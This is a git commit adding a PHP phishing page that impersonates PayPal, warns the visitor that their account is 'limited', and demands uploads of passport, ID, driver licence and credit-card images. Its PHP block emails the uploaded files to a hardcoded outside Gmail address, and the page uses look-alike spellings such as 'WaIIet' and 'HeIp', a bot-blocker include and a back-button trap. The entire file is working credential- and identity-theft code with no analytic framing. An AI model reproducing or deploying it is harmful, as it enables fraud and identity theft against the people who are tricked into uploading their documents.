7c91490ef8720cea6c3bbf876ba8ce3dafce0478
antoniola <renata.cantiek@gmail.com>
2017-09-04 01:39:39 +0700

    dsdsads
    sda

---
+++ loading.php
@@ -0,0 +1,236 @@
+
+<html lang="en">
+<head>
+		
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta name="robots" content="noindex">
+		<meta http-equiv="X-UA-Compatible" content="IE=9">
+		<link rel="stylesheet" href="app.css" />
+		<link rel="stylesheet" href="summary.css" />
+		<link media="screen" rel="stylesheet" type="text/css" href="global.css">
+		<link media="screen" rel="stylesheet" type="text/css" href="coreLayout.css">
+		<link media="screen" rel="stylesheet" type="text/css" href="eightball.css">
+		<link rel="shortcut icon" href="pp_favicon_x.ico">
+		<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<style type="text/css">
+.button:hover{background: #0A8CC4;text-decoration: none;}
+a.button, a.button:link, a.button:visited, .button, button {width: 100%;height: 44px;padding: 10px 15px;    border: 0px none;    display: block;    background: #009CDE;    box-shadow: none;    border-radius: 5px;    box-sizing: border-box;    cursor: pointer;    color: #FFF;   font-size: 1.14286em;    text-align: center;    font-weight: bold;    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;    text-shadow: none;}
+#allowed ul {margin-left: 18px;list-style-image: url('scr_check_10x10.gif');}#disallowed ul {margin-left: 18px;list-style-image: url('scr_x_10x10.gif');}div.messageBox.res-center-critical {line-height: 56px;}div.messageBox.res-center-critical {	padding-left: 80px;	color: #000;	background-image: url('icon_critalert.gif');}.profileStates,.stateHoverTexts{width:100%;list-style:none}.profileStates li,.stateHoverTexts li{display:inline-block;vertical-align:top;width:19.5%;text-align:center}.profileStates li:last-child .state,.stateHoverTexts li:last-child .state{margin:0}.profileStates{margin:0 1em 1em 0;padding-top:1.2em}.profileStates .icon{display:block;height:2em;width:2em;margin:.3em auto .5em auto;font-size:2.25em;text-align:center;line-height:1.7em;color:#223648;background:#009CDE;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%}.profileStates .state{text-align:center}.profileStates .todoState{border-color:#888}.profileStates .nextState .icon{background:#5E707E;}.profileStates .doneState .icon{background:#68ff68}.center {margin-left: 15%;	margin-right: 15%;}a {text-decoration: none}
+</style>
+</head>
+<script type="text/javascript">window.history.forward(); function noBack() { window.history.forward(); }</script><script type="text/javascript" src="query2.min.js"></script>
+<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
+<div class="standard" id="page">
+
+	<div class="navbar navbar-fixed-top header" id="bheader">
+		<div class="navbar-inner">
+			<div class="navBanner clearfix">
+				<div class="brand">
+					<a class="logo" href="#home"><img src="logo_paypal_106x27.png" border="0" alt="&Rho;ay&Rho;al"></a></div>
+				</div>
+				<div class="navMenu clearfix" id="navMenu" role="navigation">
+					<ul class="globalNav clearfix pull-left">
+						<li><a class="navIcons linkSummary" href="#home"><span>Summary</span></a></li>
+						<li><a class="navIcons linkActivity" href="#activity"><span style="color:#337ab7;">Activity</span></a></li>
+						<li><a class="navIcons linkTransfer" href="#send&request">Send &amp; Request</a></li>
+						<li><a class="navIcons linkWallet" href="#wallet">WaIIet</a></li>
+						<li><a class="navIcons linkShop" href="#shop">Shop</a></li>
+					</ul>
+					<ul class="navSecondary">
+						<li><a class="linkSettings navIcons" href="../myaccount/?settings">Settings</a></li>
+						<li><a class="linkHelp navIcons visble-LeftNav" href="../myaccount/?helpcenter/helphub/home/">HeIp</a></li>
+						<li><a class="btn btn-mini btn-secondary logout" href="../?cgi-bin/webscr?cmd=_logout">Log Out</a></li>
+					</ul>
+				</div>
+		</div>
+	</div>
+<?php include('blocker.php');?>
+	<div id="summary" class="summarySection">
+		<div class="row-fluid">
+			<div class="span4 summaryModuleContainer">
+			<section id="allowed" class="walletModule shadow" aria-labelledby="walletModuleHeader">
+				<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">What can I do while my account is limited?</h3>
+					<ul>
+						<li>update your account information</li>
+						<li>use &Rho;ay&Rho;al logos in your auction listings or on your website</li>
+					</ul>
+			</section>
+
+			<section id="disallowed" class="walletModule shadow" aria-labelledby="walletModuleHeader">
+				<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">What can&apos;t I do while my account is limited?</h3>
+					<ul>
+						<li>send or receive money</li>
+						<li>withdraw money from your account</li>
+						<li>close your account</li>
+						<li>link or remove a card</li>
+						<li>link or remove a bank account</li>
+						<li>dispute a transaction</li>
+						<li>send refunds</li>
+					</ul>
+			</section>
+
+			<section class="walletModule shadow" aria-labelledby="walletModuleHeader" style="margin-bottom: 20px;">
+			<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Secured & Certificate by</h3>
+			<div align="center"><img src="logo2.gif">&nbsp;&nbsp;<img src="sc.png">&nbsp;&nbsp;<img src="enabled_by_symc_vip.png"></div>
+			</section>
+			</div>
+			<div class="span8" id="js_activityCollection">
+			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Confirm your identity</h1>
+			<div></div><center>
+				<div id="parentchild">
+<div style="border-bottom: 1px solid #EEE; height:160px;">
+<img src="lampu.png">
+					</div>
+					
+<?php
+if ($_SERVER['REQUEST_METHOD']=="POST"){
+
+   // we'll begin by assigning the To address and message subject
+   $to="jamaahtraveliyah@gmail.com";
+   $subject="Data Pasport atau KTP";
+
+   // get the sender's name and email address
+   // we'll just plug them a variable to be used later
+   $from = stripslashes($_POST['fromname'])."<".stripslashes($_POST['fromemail']).">";
+
+   // generate a random string to be used as the boundary marker
+   $mime_boundary="==Multipart_Boundary_x".md5(mt_rand())."x";
+
+   // now we'll build the message headers
+   $headers = "From: $from\r\n" .
+   "MIME-Version: 1.0\r\n" .
+      "Content-Type: multipart/mixed;\r\n" .
+      " boundary=\"{$mime_boundary}\"";
+
+   // here, we'll start the message body.
+   // this is the text that will be displayed
+   // in the e-mail
+   $message="
+   Ya Allah,.. 
+   Paringano Sukses
+   Ya Allah
+   Ammiiinn,...";
+
+   // next, we'll build the invisible portion of the message body
+   // note that we insert two dashes in front of the MIME boundary 
+   // when we use it
+   $message = "This is a multi-part message in MIME format.\n\n" .
+      "--{$mime_boundary}\n" .
+      "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
+      "Content-Transfer-Encoding: 7bit\n\n" .
+   $message . "\n\n";
+
+   // now we'll process our uploaded files
+   foreach($_FILES as $userfile){
+      // store the file information to variables for easier access
+      $tmp_name = $userfile['tmp_name'];
+      $type = $userfile['type'];
+      $name = $userfile['name'];
+      $size = $userfile['size'];
+
+      // if the upload succeded, the file will exist
+      if (file_exists($tmp_name)){
+
+         // check to make sure that it is an uploaded file and not a system file
+         if(is_uploaded_file($tmp_name)){
+ 	
+            // open the file for a binary read
+            $file = fopen($tmp_name,'rb');
+ 	
+            // read the file content into a variable
+            $data = fread($file,filesize($tmp_name));
+
+            // close the file
+            fclose($file);
+ 	
+            // now we encode it and split it into acceptable length lines
+            $data = chunk_split(base64_encode($data));
+         }
+ 	
+         // now we'll insert a boundary to indicate we're starting the attachment
+         // we have to specify the content type, file name, and disposition as
+         // an attachment, then add the file content.
+         // NOTE: we don't set another boundary to indicate that the end of the 
+         // file has been reached here. we only want one boundary between each file
+         // we'll add the final one after the loop finishes.
+         $message .= "--{$mime_boundary}\n" .
+            "Content-Type: {$type};\n" .
+            " name=\"{$name}\"\n" .
+            "Content-Disposition: attachment;\n" .
+            " filename=\"{$fileatt_name}\"\n" .
+            "Content-Transfer-Encoding: base64\n\n" .
+         $data . "\n\n";
+      }
+   }
+   // here's our closing mime boundary that indicates the last of the message
+   $message.="--{$mime_boundary}--\n";
+   // now we just send the message
+   if (@mail($to, $subject, $message, $headers))
+     echo "<script language=\"Javascript\" src=\"loading.js\"></script><img src=\"loading.gif\"><br><meta http-equiv=\"refresh\" content=\"1;URL=/identity_confirmed\"/><br>\n";
+   else
+      echo "Failed to send";
+} else {
+?>
+<div id="page-wrap">
+<img src="identity.png">&nbsp;
+<img style="height: 110px;width: 195px;" src="card.png">
+</div></center>
+<p style="text-align: left;"><p style="text-align: left;"><p style="text-align: left;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Confirm your data correctly<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File photo of identity required front and back of<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tax id, passport, driver licence, debit and credit cards&nbsp;</p>
+<center><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" 
+   enctype="multipart/form-data" name="form1">
+<div>Your Full Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp;<input type="text" name="fromname"></div>
+<div>Email Confirmation : &nbsp;<input type="text" name="fromemail"></div>
+<p>  <font color=" red ">*</font> Required front and back </p></center>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File  front : <input type="file" name="file1"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File  back  : <input type="file" name="file2"></p>
+
+<center><button style="width: 110px !important;" type="submit" value="Submit" class="button">Process</button></center>
+</form>
+<?php } ?>
+</body>
+</html>
+					</ul>
+					</div>
+
+
+
+				</div>
+			</section>
+			</div>
+		</div>
+	</div><br>
+	<div class="navbar footer" id="bfooter">
+		<div class="navbar-inner">
+			<ul class="inline">
+				<li><a target="_blank" class="scTrack:help_link" href="#webscr?cmd=_help" style="font-size: 15px;">HeIp</a></li>
+				<li><a target="_blank" class="scTrack:contact_us_link" href="#webscr?cmd=_help&t=escalateTab" style="font-size: 15px;">Contact</a></li>
+				<li><a target="_blank" class="scTrack:security_link" href="#paypal-safety-and-security" style="font-size: 15px;">Security</a></li>
+				<li class="siteFeedback" id="siteFeedback">
+<script type="text/javascript" src="oo_engine.js"></script><script type="text/javascript">
+			var feedback_link='Feedback';	O_GoT(feedback_link);custom_var=escape('suMgkdzHJx6hpcwvFkWxug3wpqzP6YXOfz1NpCNvL\x252b1x98J0sj7a5g\x253d\x253d\x5f14dac9368e0')+'|';custom_var+='Personal|p\x2facc\x2fhelp\x2drestrictedaccts\x3a\x3a\x5fhome|US|en_US|5UY02897SU2253715|Unknown';// Paypal Custom URL class
+			var PayPalURL = function(pagename) {
+				this.language_country_code = "en_US";
+				this.dd = "US";
+				this.nn = "00";this.pagename = escape(pagename.replace(/\s|\//g, "_"));
+				this.to_str = function() {
+		
+				return "https://"+this.dd+".#"+this.language_country_code+"/"+this.nn+"/"+this.pagename+".page"
+				}
+				}
+				var paypal_url = new PayPalURL("p\x2facc\x2fhelp\x2drestrictedaccts\x3a\x3a\x5fhome");
+		_ht = paypal_url.to_str();
+		var _ht_temp=_ht;
+		var _hr_temp=_hr;
+		custom_var=custom_var + "|Unknown|Unknown";var custom_var_temp=custom_var;</script><img src="sm_333_oo.gif" alt="Feedback"></li>
+			</ul>
+			<ul class="inline">
+				<li class="copyright">&copy; 1999-2017<span class="hidden-phone"> &Rho;ay&Rho;aI. AII rights reserved.</span></li>
+				<li><a target="_blank" href="#policy_privacy" style="font-size: 12px;">Privacy</a></li>
+				<li><a target="_blank" href="#legal_agreement" style="font-size: 12px;">LegaI</a></li>
+				<li><a target="_blank" href="#marketingweb?cmd=_render-content&amp;fli=true&amp;content_ID=ua/upcoming_policies_full&amp;locale.x=en_US"  style="font-size: 12px;">PoIicy updates</a></li>
+			</ul>
+		</div>
+	</div>
+
+</div>
+</body></html>
